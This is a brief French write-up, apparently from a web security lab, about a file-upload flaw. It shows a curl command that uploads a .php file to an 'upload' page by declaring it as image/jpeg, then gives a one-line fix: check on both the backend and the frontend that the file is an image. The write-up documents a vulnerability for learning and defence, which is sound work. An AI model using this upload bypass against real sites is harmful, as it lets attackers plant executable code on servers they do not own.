<h1>Faille</h1>
 
Sur la page upload d'image
On peut POST sur le formulaire un fichier `.php` en le faisant passer par une image.
exemple (sur cet exemple je vais utiliser curl mais c'est possible de le faire avec d'autre méthodes)
 
`curl -X POST 'http://10.12.100.25/?page=upload' -F 'uploaded=@/Users/asalah/test.php;type=image/jpeg' -F 'Upload=Upload'`
 
Donc on a utilisé curl avec les deux inputs envoyés en spécifiant le `type=image/jpeg` pour le fichier `.php`.
 
<h1>Éviter cette faille</h1>
 
Pour éviter cette faille il faut vérifier bien que c'est une image sur les 2 coté backend et frontend

<h1>Ressources</h1>

Curl: https://mkyong.com/spring/curl-post-request-examples/